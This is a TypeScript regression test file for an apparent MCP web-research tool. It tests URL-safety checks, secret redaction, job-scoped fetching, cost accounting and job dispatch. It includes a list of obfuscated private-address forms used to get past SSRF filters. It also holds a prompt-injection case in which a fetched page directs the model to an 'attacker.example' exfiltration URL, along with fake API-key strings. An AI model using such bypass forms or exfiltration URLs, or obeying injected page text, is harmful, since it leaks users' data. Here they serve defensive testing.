/** Regression tests for the medium-severity review findings (5-16). */
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { describe, expect, it, vi } from "vitest";
import { loadConfig } from "../src/config.js";
import { Store } from "../src/db/store.js";
import { JobController, SPAWN_GRACE_MS } from "../src/jobs.js";
import { createLogger } from "../src/log.js";
import { budgetPages, formatFetch, MAX_RESULT_TEXT } from "../src/mcp/format.js";
import { assertPublicUrl, privateUrlReason, redact } from "../src/redact.js";
import type { Plan } from "../src/worker/plan.js";
import { buildToolset, type ToolContext } from "../src/worker/tools.js";
import { LONG_TEXT, harness } from "./helpers.js";

const tool = (name: string, ctx: ToolContext) => buildToolset("segment", ctx).concat(buildToolset("merge", ctx), buildToolset("verify", ctx)).find((t) => t.name === name)!;

describe("7: assertPublicUrl covers the forms that slipped through", () => {
  it.each([
    "http://localhost./", "http://nas.local./", "http://jira.corp./", "http://app.localhost/", "http://svc.localhost:8080/",
    "http://[::ffff:127.0.0.1]/", "http://[::ffff:10.0.0.5]/", "http://[::ffff:192.168.1.1]/", "http://[::]/",
    "http://[64:ff9b::a00:1]/", "http://[64:ff9b::7f00:1]/", "http://[fe90::1]/", "http://[febf::1]/", "http://[ff02::1]/",
    "http://198.18.0.1/", "http://198.19.255.254/", "http://224.0.0.1/", "http://0.0.0.0/", "http://192.0.0.8/",
    "http://2130706433/", "http://0x7f.1/", "http://017700000001/", "http://127.1/", // decimal, hex, octal, short forms
  ])("refuses %s", (url) => {
    expect(privateUrlReason(url), url).not.toBeNull();
  });

  it.each(["http://[::ffff:8.8.8.8]/", "http://[64:ff9b::808:808]/", "https://198.20.0.1/", "https://example.com./x"])("still allows public %s", (url) => {
    expect(privateUrlReason(url), url).toBeNull();
  });
});

describe("6: redaction terms match every spelling of a URL", () => {
  it("percent-encoded terms and punycode hosts are caught", () => {
    expect(() => assertPublicUrl("https://paste.example.com/?q=%69ntranet", ["intranet"])).toThrow(/SPURHUND_REDACT/);
    expect(() => assertPublicUrl("https://xn--bcher-kva.example/", ["bücher"])).toThrow(/SPURHUND_REDACT/);
    expect(() => assertPublicUrl("https://paste.example.com/%41cme%43orp", ["acmecorp"])).toThrow(/SPURHUND_REDACT/);
    expect(() => assertPublicUrl("https://example.com/?q=ok", ["intranet"])).not.toThrow();
  });
});

describe("6: inside a job only seen URLs can be fetched", () => {
  const page = (urls: string[]) => ({ results: urls.map((url) => ({ url, text: LONG_TEXT })), costDollars: { total: 0.001 } });

  it("refuses an exfiltration URL a fetched page told the model to open", async () => {
    const h = harness({ job: { cap: 5 }, exa: { getContents: page } });
    const r = await tool("fetch", { core: h.core, store: h.store, jobId: h.core.jobId }).handler({ urls: ["https://attacker.example/?d=the+secret+question"] });
    expect(r.isError).toBe(true);
    expect(r.text).toMatch(/Only URLs returned by a search or an Exa run in this job/);
    expect(h.exaClient.getContents).not.toHaveBeenCalled();
  });

  it("allows URLs from searches, from Exa runs and from the user's own question", async () => {
    const h = harness({ job: { cap: 5 }, exa: { search: () => ({ results: [{ url: "https://found.example/a", title: "A", highlights: ["h"] }] }), getContents: page } });
    const f = tool("fetch", { core: h.core, store: h.store, jobId: h.core.jobId });
    await tool("search", { core: h.core, store: h.store, jobId: h.core.jobId }).handler({ query: "x" });
    expect((await f.handler({ urls: ["https://found.example/a"] })).isError).toBeUndefined();
    expect(h.core.seedUserUrls("Check https://mine.example/doc, thanks. Not http://192.168.0.2/x.")).toBe(1);
    expect((await f.handler({ urls: ["https://mine.example/doc"] })).isError).toBeUndefined();
    expect((await f.handler({ urls: ["https://elsewhere.example/"] })).isError).toBe(true);
  });

  it("outside a job (ad-hoc MCP fetch) any public URL works", async () => {
    const h = harness({ exa: { getContents: page } });
    await expect(h.core.fetch({ urls: ["https://anything.example/x"] })).resolves.toBeDefined();
  });

  it("fetching the same page under two spellings costs one fetch", async () => {
    const h = harness({ exa: { getContents: page } });
    const out = await h.core.fetch({ urls: ["https://e.com/p", "http://www.e.com/p/?utm_source=x"] });
    expect(out.pages).toHaveLength(1);
    expect(h.exaClient.getContents.mock.calls[0]![0]).toEqual(["https://e.com/p"]);
  });
});

describe("8: queries are cleaned of private targets and more secret formats", () => {
  it("removes private URLs, internal hosts and private IPs but keeps public ones", () => {
    const r = redact("error at http://jira.corp/browse/X-1 and 10.0.0.5:8443 refused, nas.local backup, see https://docs.proxmox.com/a and 8.8.8.8");
    expect(r.text).toBe("error at and refused, backup, see https://docs.proxmox.com/a and 8.8.8.8");
    expect(r.redactions).toBe(3);
  });

  it("removes keys of the formats that were missed", () => {
    const r = redact(`k1 sk-proj-abc_DEF-1234567890abcdefghij k2 sk_live_abcdefghijklmnop1234 k3 AIza${"a".repeat(35)} k4 glpat-abcdefghij1234567890 k5 api_key=abcd1234efgh`);
    expect(r.text).toBe("k1 k2 k3 k4 k5");
  });

  it("removes the configured API key values themselves, in queries and URLs", async () => {
    const h = harness({ exa: { search: () => ({ results: [] }) } });
    const { Core } = await import("../src/core.js");
    const core = new Core({ config: { redact: [], fetchCacheDays: 7, engines: ["exa", "brave"], secretValues: ["exa-live-0123456789"] }, store: h.store, engines: { exa: h.exa }, exa: h.exa });
    await core.search({ query: "why does key exa-live-0123456789 fail", engines: ["exa"] });
    expect(h.exaClient.search.mock.calls[0]![0]).toBe("why does key fail");
    await expect(core.fetch({ urls: ["https://x.example/?k=exa-live-0123456789"] })).rejects.toThrow();
  });

  it("loadConfig collects the secret values (long enough ones only)", () => {
    const c = loadConfig({ EXA_API_KEY: "exa-live-0123456789", BRAVE_API_KEY: "short", CLAUDE_CODE_OAUTH_TOKEN: "oauth-token-value" });
    expect(c.secretValues).toEqual(["exa-live-0123456789", "oauth-token-value"]);
  });
});

describe("5: merge_findings stays inside the session's job", () => {
  it("cannot delete or merge another job's findings", async () => {
    const h = harness({ job: { cap: 5 } });
    const mine = h.store.addFinding({ jobId: h.core.jobId!, segment: "s", claim: "mine one", sourceIds: [], sourceKind: "primary", evidence: "snippet" });
    const mine2 = h.store.addFinding({ jobId: h.core.jobId!, segment: "s", claim: "mine two", sourceIds: [], sourceKind: "primary", evidence: "snippet" });
    const theirs = h.store.addFinding({ jobId: "job_other", segment: "s", claim: "theirs one", sourceIds: [], sourceKind: "primary", evidence: "snippet" });
    const theirs2 = h.store.addFinding({ jobId: "job_other", segment: "s", claim: "theirs two", sourceIds: [], sourceKind: "primary", evidence: "snippet" });
    const merge = tool("merge_findings", { core: h.core, store: h.store, jobId: h.core.jobId });
    const r = await merge.handler({ keep_id: theirs, merge_ids: [theirs2] });
    expect(r.isError).toBe(true);
    expect(h.store.getFinding(theirs2)).toBeDefined();
    expect((await merge.handler({ keep_id: mine, merge_ids: [theirs] })).isError).toBe(true);
    expect(h.store.getFinding(theirs)).toBeDefined();
    expect((await merge.handler({ keep_id: mine, merge_ids: [mine2] })).isError).toBeUndefined();
  });
});

describe("11: a segment's planned engines are binding", () => {
  const search = (engines?: ("exa" | "brave")[], call?: object) => {
    const h = harness({ job: { cap: 5 } });
    const t = buildToolset("segment", { core: h.core, store: h.store, jobId: h.core.jobId, segment: "s", engines }).find((x) => x.name === "search")!;
    return { h, run: (extra: object = {}) => t.handler({ query: "q", ...extra, ...(call ?? {}) }) };
  };

  it("a Brave-only segment never spends Exa, even if the model asks for it", async () => {
    const { h, run } = search(["brave"]);
    await run();
    await run({ query: "another query", engines: ["exa", "brave"] });
    expect(h.exaClient.search).not.toHaveBeenCalled();
    expect(h.brave.fetchImpl).toHaveBeenCalledTimes(2);
    const only = await run({ engines: ["exa"] });
    expect(only.isError).toBe(true);
    expect(only.text).toMatch(/limited to: brave/);
  });

  it("unrestricted sessions (planner) keep the model's choice, and an Exa+Brave segment uses both by default", async () => {
    const { h, run } = search(["exa", "brave"]);
    await run();
    expect(h.exaClient.search).toHaveBeenCalledTimes(1);
    expect(h.brave.fetchImpl).toHaveBeenCalledTimes(1);
    const free = search(undefined);
    await free.run({ engines: ["brave"] });
    expect(free.h.exaClient.search).not.toHaveBeenCalled();
  });
});

describe("12-14: fetch cache and Exa contents matching", () => {
  it("12: a failed refetch keeps the earlier copy instead of wiping it", async () => {
    let fail = false;
    const long = "abcd".repeat(2500);
    const h = harness({ exa: { getContents: (urls, o) => (fail ? { results: [], statuses: [{ id: urls[0]!, status: "error", error: { tag: "CRAWL_TIMEOUT" } }] } : { results: [{ url: urls[0]!, text: long.slice(0, (o.text as { maxCharacters: number }).maxCharacters) }] }) } });
    await h.core.fetch({ urls: ["https://e.com/long"], maxCharacters: 3000 });
    fail = true;
    const out = await h.core.fetch({ urls: ["https://e.com/long"], maxCharacters: 9000 });
    expect(out.pages[0]!.text!.length).toBe(3000);
    expect(out.pages[0]).toMatchObject({ status: "truncated", cached: true });
    expect(out.pages[0]!.reason).toMatch(/refetch failed \(fetch failed: CRAWL_TIMEOUT\)/);
    expect(h.store.getSourceByUrl("https://e.com/long")).toMatchObject({ readStatus: "truncated" });
    expect(h.store.getSourceByUrl("https://e.com/long")!.text).toHaveLength(3000);
  });

  it("13: the cache never returns more than was asked for", async () => {
    const h = harness({ exa: { getContents: (urls) => ({ results: [{ url: urls[0]!, text: "x".repeat(5000) }] }) } });
    await h.core.fetch({ urls: ["https://e.com/doc"], maxCharacters: 12_000 });
    const small = await h.core.fetch({ urls: ["https://e.com/doc"], maxCharacters: 1000 });
    expect(small.pages[0]).toMatchObject({ cached: true, status: "truncated" });
    expect(small.pages[0]!.text).toHaveLength(1000);
    const big = await h.core.fetch({ urls: ["https://e.com/doc"], maxCharacters: 12_000 });
    expect(big.pages[0]).toMatchObject({ cached: true, status: "read" });
    expect(big.pages[0]!.text).toHaveLength(5000);
  });

  it("14: Exa results are matched by id, then by canonical URL, so a redirect is not 'no content'", async () => {
    const h = harness({
      exa: {
        getContents: () => ({
          results: [
            { id: "https://a.example/old-path", url: "https://a.example/new-path", text: LONG_TEXT },
            { url: "https://www.b.example/page/", text: LONG_TEXT },
          ],
          statuses: [{ id: "https://a.example/old-path", status: "success" }, { id: "http://b.example/page", status: "success" }],
          costDollars: { total: 0.002 },
        }),
      },
    });
    const out = await h.core.fetch({ urls: ["https://a.example/old-path", "http://b.example/page"] });
    expect(out.pages.map((p) => p.status)).toEqual(["read", "read"]);
  });
});

describe("15: the verifier's paging cannot skip findings", () => {
  it("only_unverified always returns the first remaining page", async () => {
    const h = harness({ job: { cap: 5 } });
    const j = h.core.jobId!;
    for (let i = 0; i < 100; i++) h.store.addFinding({ jobId: j, segment: "s", claim: `claim number ${i}`, sourceIds: [], sourceKind: "primary", evidence: "snippet" });
    const list = tool("list_findings", { core: h.core, store: h.store, jobId: j });
    const first = await list.handler({ only_unverified: true });
    expect(first.text).toMatch(/^100 finding\(s\) still unchecked; showing the first 60\./);
    for (const m of first.text.matchAll(/^#(\d+) /gm)) h.store.setVerification(Number(m[1]), "verified", "ok");
    // The old behaviour: a follow-up with offset 60 returned nothing and left 40 unchecked.
    const second = await list.handler({ only_unverified: true, offset: 60 });
    expect(second.text).toMatch(/^40 finding\(s\) still unchecked; showing the first 40\./);
    expect([...second.text.matchAll(/^#(\d+) /gm)]).toHaveLength(40);
  });
});

describe("16: tool results stay within Desktop's limits", () => {
  it("fetch text is capped in total and flagged", () => {
    const pages = Array.from({ length: 10 }, (_, i) => ({ url: `https://e.com/${i}`, status: "read" as const, text: "x".repeat(60_000), cached: false, sourceId: i }));
    const text = formatFetch({ pages, costUsd: 0.01 });
    expect(text.length).toBeLessThan(MAX_RESULT_TEXT + 5_000);
    expect(text).toMatch(/combined text was shortened/);
    expect(text).toContain("[TRUNCATED");
    expect(budgetPages(pages).every((p) => p.status === "truncated")).toBe(true);
  });

  it("small results are untouched", () => {
    const pages = [{ url: "https://e.com", status: "read" as const, text: "short", cached: false, sourceId: 1 }];
    expect(budgetPages(pages)[0]).toMatchObject({ text: "short", status: "read", clipped: false });
  });

  it("structuredContent does not repeat the page text", async () => {
    const { Client } = await import("@modelcontextprotocol/client");
    const { InMemoryTransport } = await import("@modelcontextprotocol/server");
    const { createMcpServer } = await import("../src/mcp/server.js");
    const h = harness({ exa: { getContents: (urls) => ({ results: [{ url: urls[0]!, text: "y".repeat(5000) }] }) } });
    const server = createMcpServer({ core: h.core });
    const [ct, st] = InMemoryTransport.createLinkedPair();
    const client = new Client({ name: "t", version: "0" });
    await server.connect(st);
    await client.connect(ct);
    const r = await client.callTool({ name: "fetch", arguments: { urls: ["https://e.com/big"], max_characters: 5000 } });
    const sc = JSON.stringify(r.structuredContent);
    expect(sc).not.toContain("yyyy");
    expect((r.structuredContent as { pages: { chars: number }[] }).pages[0]!.chars).toBe(5000);
    await client.close();
    await server.close();
  });
});

describe("9: Exa runs never end unaccounted", () => {
  type FakeClient = ReturnType<typeof import("./helpers.js").fakeExaClient>;

  async function pipelineWith(opts: { exa?: Parameters<typeof import("./helpers.js").fakeExaClient>[0]; ultra?: boolean; tweak?: (c: FakeClient) => void; abortAfterMs?: number }) {
    const { runJob } = await import("../src/worker/pipeline.js");
    const { ExaEngine } = await import("../src/engines/exa.js");
    const { fakeExaClient, fakeBrave, jsonResponse } = await import("./helpers.js");
    const home = fs.mkdtempSync(path.join(os.tmpdir(), "spurhund-m9-"));
    const config = loadConfig({ SPURHUND_HOME: home, CLAUDE_CODE_OAUTH_TOKEN: "t" });
    const store = Store.memory();
    const ultra = opts.ultra ?? false;
    const plan: Plan = {
      question: "q?", successCriteria: "x", timeWindow: { from: null, to: null }, languages: ["en"], segments: [],
      exaRuns: [{ id: "run", segmentIds: [], query: "find", systemPrompt: null, effort: ultra ? "ultra" : "high", budgetUsd: ultra ? 8 : null, maxDurationSeconds: ultra ? 600 : null, outputSchemaJson: null }], notes: null,
    };
    const planId = store.createPlan({ question: "q?", depth: "standard", plan, worstCaseUsd: 1, maxExaUsd: 10 });
    const jobId = store.createJob({ planId, authMode: "oauth", models: {}, maxExaUsd: 10 });
    const job = store.claimJob(jobId, process.pid)!;
    const client = fakeExaClient({ create: () => ({ id: "run_1", status: "running" }), ...opts.exa });
    opts.tweak?.(client);
    const e = new ExaEngine(client, { retry: { attempts: 1 }, timeoutMs: 100 });
    const ac = new AbortController();
    const deps = {
      config, store, engines: { exa: e, brave: fakeBrave(() => jsonResponse({})).engine }, exa: e, log: createLogger("error", { sink: () => {} }),
      runner: { run: async () => ({ ok: true, text: "", costUsd: 0, turns: 1, subtype: "success", errors: [] }) },
      pollMs: 1, cancelPollMs: 5, signal: ac.signal, sleepFn: (ms: number) => new Promise<void>((r) => setTimeout(r, Math.min(ms, 2))),
    };
    if (opts.abortAfterMs !== undefined) setTimeout(() => ac.abort(), opts.abortAfterMs);
    const outcome = await runJob(deps, job);
    fs.rmSync(home, { recursive: true, force: true });
    return { outcome, store, jobId, client };
  }
  const gaps = (store: Store, jobId: string) => store.listGaps(jobId).map((g) => g.description).join(" | ");

  it("five failed polls in a row: the run is cancelled at Exa and settled from the cancel response", async () => {
    const { store, jobId, client } = await pipelineWith({ exa: { get: () => { throw Object.assign(new Error("boom"), { statusCode: 400 }); } }, tweak: (c) => c.agent.runs.cancel.mockResolvedValue({ id: "run_1", status: "cancelled", costDollars: { total: 0.2 } } as never) });
    expect(client.agent.runs.cancel).toHaveBeenCalledWith("run_1");
    expect(store.getExaRun("run_1")).toMatchObject({ status: "cancelled", costUsd: 0.2 });
    expect(store.sumCost(jobId, "exa")).toBeCloseTo(0.2);
  });

  it("a run whose end cannot be confirmed is charged at its worst case, recorded as abandoned and flagged", async () => {
    const { store, jobId } = await pipelineWith({
      exa: { get: () => { throw Object.assign(new Error("boom"), { statusCode: 400 }); } },
      tweak: (c) => c.agent.runs.cancel.mockResolvedValue({ id: "run_1", status: "running" } as never),
    });
    expect(store.getExaRun("run_1")).toMatchObject({ status: "abandoned", costUsd: 0.5 });
    expect(store.sumCost(jobId, "exa")).toBeCloseTo(0.5);
    expect(gaps(store, jobId)).toMatch(/did not confirm that it stopped.*\$0\.50.*dashboard/);
  });

  it("a failing cancel call is not swallowed: the run is still resolved or charged", async () => {
    const { store, jobId } = await pipelineWith({
      exa: { get: () => { throw Object.assign(new Error("boom"), { statusCode: 400 }); } },
      tweak: (c) => c.agent.runs.cancel.mockRejectedValue(Object.assign(new Error("cancel failed"), { statusCode: 400 })),
    });
    expect(store.getExaRun("run_1")!.status).toBe("abandoned");
    expect(store.sumCost(jobId, "exa")).toBeCloseTo(0.5);
  });

  it("a canceled job with an ultra run whose stop stays 'running' is charged its budget cap, not $0", async () => {
    const { outcome, store, jobId, client } = await pipelineWith({
      ultra: true,
      exa: { get: (id) => ({ id, status: "running" }) },
      tweak: (c) => c.agent.runs.stop.mockResolvedValue({ id: "run_1", status: "running" } as never),
      abortAfterMs: 40,
    });
    expect(outcome).toBe("canceled");
    expect(client.agent.runs.stop).toHaveBeenCalledWith("run_1");
    expect(store.getExaRun("run_1")).toMatchObject({ status: "abandoned", costUsd: 8 });
    const report = store.getReport(jobId)!.json as { costs: { exaUsd: number } };
    expect(report.costs.exaUsd).toBeCloseTo(8);
  });

  it("the stop response alone is enough: no extra GET is needed to settle", async () => {
    const { store, client } = await pipelineWith({
      ultra: true,
      exa: { get: (id) => ({ id, status: "running" }) },
      tweak: (c) => c.agent.runs.stop.mockResolvedValue({ id: "run_1", status: "completed", stopReason: "stopped", costDollars: { total: 1.5 } } as never),
      abortAfterMs: 40,
    });
    expect(client.agent.runs.stop).toHaveBeenCalledTimes(1);
    expect(store.getExaRun("run_1")).toMatchObject({ status: "completed", costUsd: 1.5, stopReason: "stopped" });
  });
});

describe("10, 17, 18: job dispatch", () => {
  const plan: Plan = { question: "q?", successCriteria: "x", timeWindow: { from: null, to: null }, languages: ["en"], segments: [], exaRuns: [], notes: null };
  function setup(env: Record<string, string> = {}, alive: (pid: number) => boolean = () => true) {
    let t = Date.parse("2026-10-15T10:00:00Z");
    const store = Store.memory(() => new Date(t));
    const config = loadConfig({ SPURHUND_HOME: "/tmp/spurhund-dispatch", CLAUDE_CODE_OAUTH_TOKEN: "t", SPURHUND_MAX_CONCURRENT_JOBS: "1", ...env });
    const spawnWorker = vi.fn<(id: string) => void>();
    const jobs = new JobController({ config, store, log: createLogger("error", { sink: () => {} }), spawnWorker, isAlive: alive });
    const newPlan = () => store.createPlan({ question: "q?", depth: "standard", plan, worstCaseUsd: 1, maxExaUsd: 5 });
    return { store, jobs, spawnWorker, newPlan, advance: (ms: number) => void (t += ms) };
  }

  it("17: two quick starts cannot exceed the limit, before any worker has claimed anything", () => {
    const { jobs, spawnWorker, newPlan } = setup();
    const a = jobs.start(newPlan());
    const b = jobs.start(newPlan());
    expect([a.queued, b.queued]).toEqual([false, true]);
    expect(spawnWorker).toHaveBeenCalledTimes(1);
    expect(spawnWorker).toHaveBeenCalledWith(a.jobId);
  });

  it("10: when a running job's worker dies, the next queued job gets a worker", () => {
    let alive = true;
    const { jobs, store, spawnWorker, newPlan } = setup({}, () => alive);
    const a = jobs.start(newPlan());
    const b = jobs.start(newPlan());
    store.claimJob(a.jobId, 4242); // a's worker started
    expect(b.queued).toBe(true);
    alive = false; // OOM, reboot, kill -9
    jobs.status(b.jobId); // any entry point runs housekeeping
    expect(store.getJob(a.jobId)!.state).toBe("failed");
    expect(spawnWorker).toHaveBeenLastCalledWith(b.jobId);
    expect(spawnWorker).toHaveBeenCalledTimes(2);
    expect(store.getJob(b.jobId)!.spawnedAt).not.toBeNull();
  });

  it("10: a worker that never claims its job is detected and the job failed, freeing the slot", () => {
    const { jobs, store, spawnWorker, newPlan, advance } = setup();
    const a = jobs.start(newPlan());
    const b = jobs.start(newPlan());
    advance(SPAWN_GRACE_MS - 1000);
    jobs.status(a.jobId);
    expect(store.getJob(a.jobId)!.state).toBe("submitted"); // still within the grace period
    expect(spawnWorker).toHaveBeenCalledTimes(1);
    advance(2000);
    jobs.status(a.jobId);
    expect(store.getJob(a.jobId)).toMatchObject({ state: "failed" });
    expect(store.getJob(a.jobId)!.error).toMatch(/never started the job/);
    expect(spawnWorker).toHaveBeenLastCalledWith(b.jobId); // the queued job moves up
  });

  it("18: cancelling cannot win against a worker that already claimed the job", () => {
    const { jobs, store, newPlan } = setup();
    const a = jobs.start(newPlan());
    expect(store.cancelSubmitted(a.jobId)).toBe(true); // unclaimed: cancelled atomically
    const b = jobs.start(newPlan());
    store.claimJob(b.jobId, process.pid);
    expect(store.cancelSubmitted(b.jobId)).toBe(false); // claimed: the update does not apply
    const r = jobs.cancel(b.jobId);
    expect(r.state).toBe("working");
    expect(store.isCancelRequested(b.jobId)).toBe(true); // so the worker is told to stop
  });
});
